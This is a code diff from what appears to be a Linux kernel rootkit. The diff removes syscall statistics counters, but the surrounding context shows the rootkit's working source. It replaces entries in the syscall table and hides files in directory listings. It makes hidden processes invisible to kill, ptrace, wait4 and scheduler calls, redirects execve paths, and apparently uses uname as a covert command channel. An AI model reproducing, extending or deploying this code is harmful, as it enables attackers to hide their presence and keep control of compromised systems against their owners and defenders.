@@ -22,7 +22,6 @@
 
 #define HOOK(sys, func)	\
 		do {	\
-			sys_stats_init(__NR_##sys);			\
 			fake_sct[__NR_##sys] = (unsigned long)func;	\
 		} while (0)
 
@@ -43,7 +42,6 @@ asmlinkage long new_sys_chdir(char *path)
 {
 	long ret;
 	struct stat st;
-	SYS_STATS_INC(chdir);
 
 	SET_KERNEL_DS;
 	ret = ksyms.old_sys_stat(path, &st);
@@ -64,7 +62,6 @@ asmlinkage long new_sys_stat(char *path, struct stat *st)
 {
 	long ret;
 	struct stat tmp_st;
-	SYS_STATS_INC(stat);
 
 	SET_KERNEL_DS;
 	ret = ksyms.old_sys_stat(path, &tmp_st);
@@ -86,7 +83,6 @@ asmlinkage long new_sys_lstat(char *path, struct stat *st)
 {
 	long ret;
 	struct stat tmp_st;
-	SYS_STATS_INC(lstat);
 
 	SET_KERNEL_DS;
 	ret = ksyms.old_sys_lstat(path, &tmp_st);
@@ -109,7 +105,6 @@ asmlinkage long new_sys_fstatat(int fd, char *path, struct stat *st, int flag)
 {
 	long ret;
 	struct stat tmp_st;
-	SYS_STATS_INC(newfstatat);
 
 	SET_KERNEL_DS;
 	ret = ksyms.old_sys_fstatat(fd, path, &tmp_st, flag);
@@ -133,7 +128,6 @@ asmlinkage long new_sys_open(char *filename, int flags, umode_t mode)
 	long ret;
 	char *old_path, *new_path;
 	struct stat st;
-	SYS_STATS_INC(open);
 
 	if ((mode & 0xfffffffe) != 0) {
 		/* ! O_RDONLY */
@@ -168,7 +162,6 @@ asmlinkage long new_sys_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 {
 	long ret;
 	unsigned long r;
-	SYS_STATS_INC(getdents);
 
 	ret = ksyms.old_sys_getdents(fd, dirp, count);
 	if (ret <= 0)
@@ -180,7 +173,6 @@ asmlinkage long new_sys_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 		char *ptr = (char *)dirp + pos;
 		struct linux_dirent *d = (struct linux_dirent *)ptr;
 
-		/* FIXME: use ksyms */
 		if (ksyms._copy_from_user(&d_ino, &d->d_ino, sizeof(d_ino)))
 			return -EFAULT;
 		if (ksyms._copy_from_user(&d_reclen, &d->d_reclen, sizeof(d_reclen)))
@@ -206,7 +198,6 @@ asmlinkage long new_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 {
 	long ret;
 	unsigned long r;
-	SYS_STATS_INC(getdents64);
 
 	ret = ksyms.old_sys_getdents64(fd, dirp, count);
 	if (ret <= 0)
@@ -245,7 +236,6 @@ new_sys_execve(const char *__filename, const char **argv, const char **envp)
 	int r;
 	char *old_path, *new_path;
 	char *filename = (char *)__filename;
-	SYS_STATS_INC(execve);
 
 	old_path = anima_strndup_from_user(filename, MAX_PATH_LEN);
 	if (!old_path)
@@ -282,7 +272,6 @@ out:
 
 asmlinkage long new_sys_getpgid(pid_t pid)
 {
-	SYS_STATS_INC(getgid);
 	if (is_pid_hidden(pid))
 		return -ESRCH;
 
@@ -291,7 +280,6 @@ asmlinkage long new_sys_getpgid(pid_t pid)
 
 asmlinkage long new_sys_getsid(pid_t pid)
 {
-	SYS_STATS_INC(getsid);
 	if (is_pid_hidden(pid))
 		return -ESRCH;
 
@@ -300,7 +288,6 @@ asmlinkage long new_sys_getsid(pid_t pid)
 
 asmlinkage long new_sys_setpgid(pid_t pid, pid_t pgid)
 {
-	SYS_STATS_INC(setpgid);
 	if (is_pid_hidden(pid))
 		return -ESRCH;
 
@@ -309,7 +296,6 @@ asmlinkage long new_sys_setpgid(pid_t pid, pid_t pgid)
 
 asmlinkage long new_sys_getpriority(int which, int who)
 {
-	SYS_STATS_INC(getpriority);
 	if (is_pid_hidden(who))
 		return -ESRCH;
 
@@ -318,7 +304,6 @@ asmlinkage long new_sys_getpriority(int which, int who)
 
 asmlinkage long new_sys_kill(pid_t pid, int sig)
 {
-	SYS_STATS_INC(kill);
 	if (is_pid_hidden(pid))
 		return -ESRCH;
 
@@ -327,7 +312,6 @@ asmlinkage long new_sys_kill(pid_t pid, int sig)
 
 asmlinkage long new_sys_sched_setscheduler(pid_t pid, int policy, void *param)
 {
-	SYS_STATS_INC(sched_setscheduler);
 	if (is_pid_hidden(pid))
 		return -ESRCH;
 
@@ -336,7 +320,6 @@ asmlinkage long new_sys_sched_setscheduler(pid_t pid, int policy, void *param)
 
 asmlinkage long new_sys_sched_setparam(pid_t pid, void *param)
 {
-	SYS_STATS_INC(sched_setparam);
 	if (is_pid_hidden(pid))
 		return -ESRCH;
 
@@ -345,7 +328,6 @@ asmlinkage long new_sys_sched_setparam(pid_t pid, void *param)
 
 asmlinkage long new_sys_sched_getscheduler(pid_t pid)
 {
-	SYS_STATS_INC(sched_getscheduler);
 	if (is_pid_hidden(pid))
 		return -ESRCH;
 
@@ -354,7 +336,6 @@ asmlinkage long new_sys_sched_getscheduler(pid_t pid)
 
 asmlinkage long new_sys_sched_getparam(pid_t pid, void *param)
 {
-	SYS_STATS_INC(sched_getparam);
 	if (is_pid_hidden(pid))
 		return -ESRCH;
 
@@ -364,7 +345,6 @@ asmlinkage long new_sys_sched_getparam(pid_t pid, void *param)
 asmlinkage long new_sys_sched_setaffinity(pid_t pid, unsigned int len,
 					unsigned long *user_mask_ptr)
 {
-	SYS_STATS_INC(sched_setaffinity);
 	if (is_pid_hidden(pid))
 		return -ESRCH;
 
@@ -374,7 +354,6 @@ asmlinkage long new_sys_sched_setaffinity(pid_t pid, unsigned int len,
 asmlinkage long new_sys_sched_getaffinity(pid_t pid, unsigned int len,
 					unsigned long *user_mask_ptr)
 {
-	SYS_STATS_INC(sched_getaffinity);
 	if (is_pid_hidden(pid))
 		return -ESRCH;
 
@@ -383,7 +362,6 @@ asmlinkage long new_sys_sched_getaffinity(pid_t pid, unsigned int len,
 
 asmlinkage long new_sys_sched_rr_get_interval(pid_t pid, void *interval)
 {
-	SYS_STATS_INC(sched_rr_get_interval);
 	if (is_pid_hidden(pid))
 		return -ESRCH;
 
@@ -393,7 +371,6 @@ asmlinkage long new_sys_sched_rr_get_interval(pid_t pid, void *interval)
 asmlinkage long new_sys_wait4(pid_t pid, int *status,
 				int options, void *rusage)
 {
-	SYS_STATS_INC(wait4);
 	if (is_pid_hidden(pid))
 		return -ESRCH;
 
@@ -404,7 +381,6 @@ asmlinkage long new_sys_waitid(int which, pid_t pid,
 				void *infop,
 				int options, void *ru)
 {
-	SYS_STATS_INC(waitid);
 	if (is_pid_hidden(pid))
 		return -ESRCH;
 
@@ -414,7 +390,6 @@ asmlinkage long new_sys_waitid(int which, pid_t pid,
 asmlinkage long new_sys_rt_tgsigqueueinfo(pid_t tgid, pid_t pid, int sig,
 					siginfo_t *uinfo)
 {
-	SYS_STATS_INC(rt_tgsigqueueinfo);
 	if (is_pid_hidden(pid))
 		return -ESRCH;
 
@@ -423,7 +398,6 @@ asmlinkage long new_sys_rt_tgsigqueueinfo(pid_t tgid, pid_t pid, int sig,
 
 asmlinkage long new_sys_rt_sigqueueinfo(int pid, int sig, siginfo_t *uinfo)
 {
-	SYS_STATS_INC(rt_sigqueueinfo);
 	if (is_pid_hidden(pid))
 		return -ESRCH;
 
@@ -433,7 +407,6 @@ asmlinkage long new_sys_rt_sigqueueinfo(int pid, int sig, siginfo_t *uinfo)
 asmlinkage long new_sys_prlimit64(pid_t pid, unsigned int resource,
 					void *new_rlim, void *old_rlim)
 {
-	SYS_STATS_INC(prlimit64);
 	if (is_pid_hidden(pid))
 		return -ESRCH;
 
@@ -442,7 +415,6 @@ asmlinkage long new_sys_prlimit64(pid_t pid, unsigned int resource,
 
 asmlinkage long new_sys_ptrace(long request, pid_t pid, void *addr, void *data)
 {
-	SYS_STATS_INC(ptrace);
 	if (is_pid_hidden(pid))
 		return -ESRCH;
 
@@ -453,7 +425,6 @@ asmlinkage long new_sys_ptrace(long request, pid_t pid, void *addr, void *data)
 asmlinkage long new_sys_migrate_pages(pid_t pid, unsigned long maxnode,
 					unsigned long *from, unsigned long *to)
 {
-	SYS_STATS_INC(migrate_pages);
 	if (is_pid_hidden(pid))
 		return -ESRCH;
 
@@ -467,7 +438,6 @@ asmlinkage long new_sys_move_pages(pid_t pid, unsigned long nr_pages,
 				int *status,
 				int flags)
 {
-	SYS_STATS_INC(move_pages);
 	if (is_pid_hidden(pid))
 		return -ESRCH;
 
@@ -476,7 +446,6 @@ asmlinkage long new_sys_move_pages(pid_t pid, unsigned long nr_pages,
 
 asmlinkage long new_sys_get_robust_list(int pid, void **head_ptr, size_t *len_ptr)
 {
-	SYS_STATS_INC(get_robust_list);
 	if (is_pid_hidden(pid))
 		return -ESRCH;
 
@@ -487,7 +456,6 @@ asmlinkage long new_sys_perf_event_open(
                 void *attr_uptr,
                 pid_t pid, int cpu, int group_fd, unsigned long flags)
 {
-	SYS_STATS_INC(perf_event_open);
 	if (is_pid_hidden(pid))
 		return -ESRCH;
 
@@ -497,7 +465,6 @@ asmlinkage long new_sys_perf_event_open(
 asmlinkage void new_sys_exit(int error_code)
 {
 	pid_t pid = ksyms.old_sys_getpid();
-	SYS_STATS_INC(exit);
 
 	if (is_pid_hidden_no_getpid(pid))
 		unhide_pid(pid);
@@ -508,7 +475,6 @@ asmlinkage void new_sys_exit(int error_code)
 asmlinkage void new_sys_exit_group(int error_code)
 {
 	pid_t pid = ksyms.old_sys_getpid();
-	SYS_STATS_INC(exit_group);
 
 	if (is_pid_hidden_no_getpid(pid))
 		unhide_pid(pid);
@@ -535,8 +501,6 @@ asmlinkage long new_sys_fork(void)
 	pid_t pid;
 	//register int pid_hidden = is_pid_hidden_no_getpid(ksyms.old_sys_getpid());
 
-	//SYS_STATS_INC(fork);
-
 	pid = ksyms.old_sys_fork();
 	if (pid)
 		pr_debug("%s: pid=%d\n", __func__, pid);
@@ -547,7 +511,6 @@ asmlinkage long new_sys_fork(void)
 asmlinkage long new_sys_vfork(void)
 {
 	/* TODO */
-	SYS_STATS_INC(vfork);
 	return ksyms.old_sys_vfork();
 }
 
@@ -562,7 +525,6 @@ asmlinkage long new_sys_reboot(int magic1, int magic2, int cmd, void *arg)
 asmlinkage long new_sys_newuname(struct new_utsname *name)
 {
 	struct rk_args args;
-	SYS_STATS_INC(uname);
 
 	if (ksyms._copy_from_user(&args, name, sizeof(args)))
 		pr_debug("%s: _copy_from_user failed\n", __func__);
@@ -608,9 +570,6 @@ asmlinkage long new_sys_newuname(struct new_utsname *name)
 #ifdef DEBUG
 	case DEBUG_RK:
 		debug_rk();
-		break;
-	case DEBUG_STATS:
-		debug_sys_stats();
 		break;
 #endif
 	}
